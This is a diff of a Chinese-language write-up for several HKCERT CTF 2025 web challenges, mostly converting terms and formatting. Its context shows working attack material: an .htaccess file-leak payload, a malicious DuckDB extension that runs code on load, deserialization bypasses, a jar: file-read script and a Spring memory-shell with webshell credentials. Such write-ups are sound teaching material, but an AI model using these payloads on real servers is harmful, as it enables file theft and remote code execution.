@@ -19,21 +19,19 @@ HKCERT CTF 2025 线上初赛于香港时间 2025 年 12 月 19 日 16:00 至 21 
 
 ### 1. 资讯收集与测试
 
-打开题目，发现是一个档案上传页面，标题为 "P-Phobia Upload"（P 恐惧症）。
-尝试上传 `shell.php`，提示上传失败或被拦截。
-尝试上传 `test.txt` 或图片，上传成功，并返回上传路径 `/uploads/test.txt`。
+打开题目，发现是一个文件上传页面，标题为 “P-Phobia Upload”（P 恐惧症）。尝试上传 `shell.php` 时，文件被拦截；上传 `test.txt` 或图片则可以成功，并返回上传路径，例如 `/uploads/test.txt`。
 
-推测题目过滤了 php 后缀，且环境为 Apache 伺服器。尝试上传 `.htaccess` 档案，发现上传成功。
+推测题目过滤了 php 后缀，且环境为 Apache 服务器。尝试上传 `.htaccess` 文件，发现上传成功。
 
 ### 2. 漏洞分析
 
-既然可以上传 `.htaccess`，我们可以控制 Apache 对该目录下档案的处理方式。
+既然可以上传 `.htaccess`，我们可以控制 Apache 对该目录下文件的处理方式。
 通常有几种思路：
 
-1. **解析图片为 PHP**：使用 `AddType application/x-httpd-php .jpg`。但在 "P-Phobia" 的设定下，可能档案内容也过滤了 `<?php`，或者伺服器禁用了其他后缀的解析。
-2. **利用 Apache 表达式泄露档案**：这是非 RCE 的解法，直接读取 Flag。
+1. **解析图片为 PHP**：使用 `AddType application/x-httpd-php .jpg`。但在 "P-Phobia" 的设定下，可能文件内容也过滤了 `<?php`，或者服务器禁用了其他后缀的解析。
+2. **利用 Apache 表达式泄露文件**：这是非 RCE 的解法，直接读取 Flag。
 
-Apache 2.4.x 版本支持表达式语法（Expression Parser）。我们可以使用 `Redirect` 指令，将请求重定向，并在重定向的 URL 中包含我们想要的档案内容。
+Apache 2.4.x 版本支持表达式语法（Expression Parser）。我们可以使用 `Redirect` 指令，将请求重定向，并在重定向的 URL 中包含我们想要的文件内容。
 
 **Payload 构造：**
 
@@ -41,15 +39,15 @@ Apache 2.4.x 版本支持表达式语法（Expression Parser）。我们可以�
 redirect permanent "/%{BASE64:%{FILE:/flag}}"
 ```
 
-* `redirect permanent`：通过 301 状态码重定向。
-* `%{FILE:/flag}`：读取档案系统中的 `/flag` 内容。
-* `%{BASE64:...}`：将读取到的内容进行 Base64 编码，防止换行符或特殊字元破坏 HTTP Header 结构。
+- `redirect permanent`：通过 301 状态码重定向。
+- `%{FILE:/flag}`：读取文件系统中的 `/flag` 内容。
+- `%{BASE64:...}`：将读取到的内容进行 Base64 编码，防止换行符或特殊字符破坏 HTTP Header 结构。
 
 ### 3. 解题步骤
 
 #### 第一步：编写恶意的 .htaccess
 
-创建一个名为 `.htaccess` 的档案，内容如下：
+创建一个名为 `.htaccess` 的文件，内容如下：
 
 ```apache
 redirect permanent "/%{BASE64:%{FILE:/flag}}"
@@ -57,11 +55,11 @@ redirect permanent "/%{BASE64:%{FILE:/flag}}"
 
 #### 第二步：上传档案
 
-通过题目页面上传该档案。Content-Type 建议修改为 `application/octet-stream` 防止被识别为文本，不过题目通常只校验后缀。
+通过题目页面上传该文件。Content-Type 建议修改为 `application/octet-stream` 防止被识别为文本，不过题目通常只校验后缀。
 
 #### 第三步：触发漏洞
 
-上传成功后，访问上传目录下的任意档案（即使是不存在的档案），例如 `http://target/uploads/.htaccess` 或者 `http://target/uploads/non_exist`。
+上传成功后，访问上传目录下的任意文件（即使是不存在的文件），例如 `http://target/uploads/.htaccess` 或者 `http://target/uploads/non_exist`。
 
 Apache 会匹配到 `.htaccess` 中的规则，尝试读取 `/flag` 并进行重定向。
 
@@ -75,7 +73,7 @@ Date: Sun, 07 Dec 2025 01:01:08 GMT
 Location: http://localhost:12223/ZmxhZ3sxNTA4NzhmNC1lYzU0LTQyZWQtOTcwYi03NTc4NWE3ZDBkOGR9IA==
 ```
 
-提取 `Location` 后的 Base64 字串：
+提取 `Location` 后的 Base64 字符串：
 `ZmxhZ3sxNTA4NzhmNC1lYzU0LTQyZWQtOTcwYi03NTc4NWE3ZDBkOGR9IA==`
 
 解码得到 Flag：
@@ -127,16 +125,19 @@ else:
 
 ### 漏洞分析
 
-打开题目，我们发现目标开放了 CloudBeaver 资料库管理介面，包含多个JDBC 数据库链接，而其中只有`DuckDB` 支持内存中创建
+目标开放了 CloudBeaver 数据库管理界面，其中包含多种 JDBC 数据库连接；只有 DuckDB 支持创建内存数据库。
+
 ![Dam-Breach 题解截图](dam-breach-image.png)
-针对JDBC攻击很难挖出新的攻击点，所以只能针对DuckDB展开攻击，DuckDB有加载扩展的功能，但是有严格限制
->Extension installation is the process of downloading the extension binary and verifying its metadata. During installation, DuckDB stores the downloaded extension and some metadata in a local directory. From this directory DuckDB can then load the Extension whenever it needs to. This means that installation needs to happen only once.
+
+因此，将注意力转向 DuckDB 的扩展加载功能。扩展安装过程中存在严格限制：
+
+> Extension installation is the process of downloading the extension binary and verifying its metadata. During installation, DuckDB stores the downloaded extension and some metadata in a local directory. From this directory DuckDB can then load the Extension whenever it needs to. This means that installation needs to happen only once.
 
 ### 构造 DuckDB 扩展
 
-参考<https://github.com/duckdb/extension-template/> 编写恶意插件，需要注意CloudBeaver中的`DuckDB` 版本为`v1.3.2`，在编译过程中需要切换版本
+参考 [DuckDB 扩展模板](https://github.com/duckdb/extension-template/)编写扩展。CloudBeaver 中的 DuckDB 版本为 `v1.3.2`，编译时需要切换到对应版本。
 
-```c++
+```cpp
 #define DUCKDB_EXTENSION_MAIN
 
 #include "quack_extension.hpp"
@@ -268,7 +269,7 @@ DUCKDB_EXTENSION_API const char *quack_version() {
 }
 ```
 
-```c++
+```cpp
 #pragma once
 
 #include "duckdb.hpp"
@@ -287,9 +288,9 @@ public:
 
 ### 安装与加载流程
 
-观察`DuckDB`的`INSTALL`和`LOAD` 语句可以发现，`INSTALL` 语句支持远端加载(https 协议)和本地加载，且会对扩展进行签名校验和检测
+观察 DuckDB 的 `INSTALL` 和 `LOAD` 语句：`INSTALL` 支持从远端 HTTPS 地址或本地安装扩展，并会检查扩展签名。
 
-```c++
+```cpp
 #include "duckdb/common/exception/http_exception.hpp"
 #include "duckdb/common/gzip_file_system.hpp"
 #include "duckdb/common/http_util.hpp"
@@ -879,9 +880,9 @@ unique_ptr<ExtensionInstallInfo> ExtensionHelper::InstallExtensionInternal(Datab
 } // namespace duckdb
 ```
 
-而在`LOAD` 语法才是将二进制文件加载到`DuckDB`实例，且在加载过程中会依据文件名称进行函数加载
+`LOAD` 则负责将二进制文件加载到 DuckDB 实例，并在加载过程中依据文件名查找相应函数。
 
-```c++
+```cpp
 
 #include "duckdb.h"
 #include "duckdb/common/dl.hpp"
@@ -1557,9 +1558,9 @@ string ExtensionHelper::ExtractExtensionPrefixFromPath(const string &path) {
 } // namespace duckdb
 ```
 
-但是可以通过`__attribute__ ((__constructor__))`确保此函式在 dlopen 时立即执行
+可以通过 `__attribute__ ((__constructor__))` 让函数在 `dlopen` 时立即执行。
 
-```c
+```cpp
 extern "C" {
     #ifndef _WIN32
     __attribute__ ((__constructor__)) void preload (void){
@@ -1580,7 +1581,7 @@ extern "C" {
 
 ### 上传扩展
 
-而在`/api/resultset/blob/`路由中存在文件上传接口，但是文件名不可控，通过此接口上传`DuckDB`扩展
+`/api/resultset/blob/` 路由提供文件上传接口，但文件名不可控。可以通过该接口上传 DuckDB 扩展。
 
 ```java
 /*
@@ -1701,7 +1702,7 @@ public class WebSQLFileLoaderServlet extends WebServiceServletBase {
 
 ### 完整利用脚本
 
-编写EXP直接利用
+将上述步骤组合为利用脚本：
 
 ```python
 import requests
@@ -1981,7 +1982,7 @@ if __name__ == "__main__":
 
 ### 漏洞分析
 
-使用 `JADX` 反编译 JAR 包后，我们发现 `ChallengeController` 中存在一个 Hessian 反序列化入口。该入口显式开启了 `allowNonSerializable(true)`，允许反序列化未继承 `Serializable` 介面的类别。然而，底层依赖的 `hessian-lite` 库存在一个严格的反序列化黑名单。
+使用 `JADX` 反编译 JAR 包后，我们发现 `ChallengeController` 中存在一个 Hessian 反序列化入口。该入口显式开启了 `allowNonSerializable(true)`，允许反序列化未继承 `Serializable` 接口的类别。然而，底层依赖的 `hessian-lite` 库存在一个严格的反序列化黑名单。
 
 ```java
 package org.example.labyrinth.controller;
@@ -2153,7 +2154,7 @@ weblogic.jms.common.
 ### CustomProxy 与动态代理
 
 从正面直接绕过黑名单的难度极大。但是，配合题目提供的 Gadget 类别 `CustomProxy` 以及 JDK 内部的机制，我们可以实现绕过。虽然 Hessian 通常难以成功反序列化标准代理类，但此处的配置允许我们利用这一点。
-题目提供了一个 `CustomProxy` 类别，它继承自 `Proxy` 并实现了 `Comparable` 介面。其关键在于 `compareTo` 方法会将调用转发给内部的 `InvocationHandler`。
+题目提供了一个 `CustomProxy` 类别，它继承自 `Proxy` 并实现了 `Comparable` 接口。其关键在于 `compareTo` 方法会将调用转发给内部的 `InvocationHandler`。
 
 ```java
 package org.example.labyrinth.model;
@@ -2899,7 +2900,7 @@ Content-Type: application/x-www-form-urlencoded
 
 ![Hessian-Labyrinth 题解截图](hessian-labyrinth-image-1.png)
 
-```txt
+```text
 基础信息:
 加密器: JAVA_AES_BASE64
 密码: CwHkwlKcuu
@@ -2909,6 +2910,7 @@ Content-Type: application/x-www-form-urlencoded
 ```
 
 ![Hessian-Labyrinth 题解截图](hessian-labyrinth-image-2.png)
+
 ![Hessian-Labyrinth 题解截图](hessian-labyrinth-image-3.png)
 
 
@@ -2918,16 +2920,17 @@ Content-Type: application/x-www-form-urlencoded
 
 ### 漏洞分析
 
-打开网站首页发现存在任意文件读取漏洞，虽然`file`协议被`ban`，但是`jar`协议没有，根据提示`app.jar`在`/app/app.jar`
+网站首页存在任意文件读取漏洞：`file` 协议被过滤，但 `jar` 协议没有。根据题目提示，应用位于 `/app/app.jar`。
+
 ![NetWatcher 题解截图](netwatcher-image.png)
 
-通过`jar:file:/app/app.jar!/`读取文件，根据报错知道`PreviewController`在`jar`中路径
+通过 `jar:file:/app/app.jar!/` 读取文件，根据报错确定 `PreviewController` 在 JAR 中的路径。
 
 ![NetWatcher 题解截图](netwatcher-image-1.png)
 
 ### 读取 JAR 中的文件
 
-编写脚本读取`jar`中文件
+编写脚本读取 JAR 中的文件：
 
 ```python
 import requests
@@ -3088,7 +3091,8 @@ python exp.py --url http://localhost:12338/api/preview /BOOT-INF/classes/applica
 
 ### 发现反序列化入口
 
-根据注解存在`AdminController`路由
+根据注解发现 `AdminController` 路由：
+
 ![NetWatcher 题解截图](netwatcher-image-2.png)
 
 ```bash
@@ -3096,14 +3100,16 @@ python exp.py --url http://localhost:12338/api/preview /BOOT-INF/classes/org/ctf
 ```
 
 ![NetWatcher 题解截图](netwatcher-image-3.png)
-再读取内部类`AdminController$SecureObjectInputStream`
+
+再读取内部类 `AdminController$SecureObjectInputStream`：
 
 ```bash
  python exp.py --url http://localhost:12338/api/preview '/BOOT-INF/classes/org/ctf/netwatcher/controller/AdminController$SecureObjectInputStream.class'
 ```
 
 ![NetWatcher 题解截图](netwatcher-image-4.png)
-`pom.xml` 存在 `springboot-aop`依赖
+
+`pom.xml` 中存在 `springboot-aop` 依赖：
 
 ```xml
         <dependency>
@@ -3115,7 +3121,7 @@ python exp.py --url http://localhost:12338/api/preview /BOOT-INF/classes/org/ctf
 
 ### 构造利用链
 
-编写PoC绕过JDK17限制加载`templatesimpl` 和内存吗
+编写 PoC，绕过 JDK 17 的限制并加载 `TemplatesImpl` 和内存马：
 
 ```java
 package org.example.springbootdestest.poc;
@@ -3380,7 +3386,7 @@ public class SpringRequestMappingMemshell {
 
 ### 发送 Payload
 
-发送payload
+发送 Payload：
 
 ```http
 POST /internal/api/v1/admin/console HTTP/1.1
@@ -3407,7 +3413,7 @@ rO0ABXNyACNqYXZheC5zd2luZy5ldmVudC5FdmVudExpc3RlbmVyTGlzdJFIzC1z3w7eAwAAeHB0ABdq
 
 ![NetWatcher 题解截图](netwatcher-image-5.png)
 
-```txt
+```text
  基础信息:
 加密器: JAVA_AES_BASE64
 密码: fqKXy
@@ -3417,6 +3423,7 @@ rO0ABXNyACNqYXZheC5zd2luZy5ldmVudC5FdmVudExpc3RlbmVyTGlzdJFIzC1z3w7eAwAAeHB0ABdq
 ```
 
 ![NetWatcher 题解截图](netwatcher-image-6.png)
+
 ![NetWatcher 题解截图](netwatcher-image-7.png)
 
 ```bash
